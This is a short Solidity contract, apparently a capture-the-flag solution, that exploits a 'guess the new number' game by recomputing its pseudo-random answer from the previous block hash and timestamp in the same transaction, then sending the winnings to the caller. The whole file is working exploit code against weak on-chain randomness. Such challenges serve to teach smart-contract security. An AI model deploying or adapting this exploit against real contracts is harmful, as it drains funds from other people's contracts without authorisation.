// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGuessTheNewNumber {
    function guess(uint8 n) external payable;
}

contract GuessExploit {

    IGuessTheNewNumber aContrac;

    constructor(address _contract) {
        aContrac = IGuessTheNewNumber(_contract);
    }

    function exploit() public payable {
        aContrac.guess{value: msg.value}(getAnswer());
        payable(msg.sender).transfer(address(this).balance);
    }     

    function getAnswer() public view returns(uint8) {
        return uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
    }
}

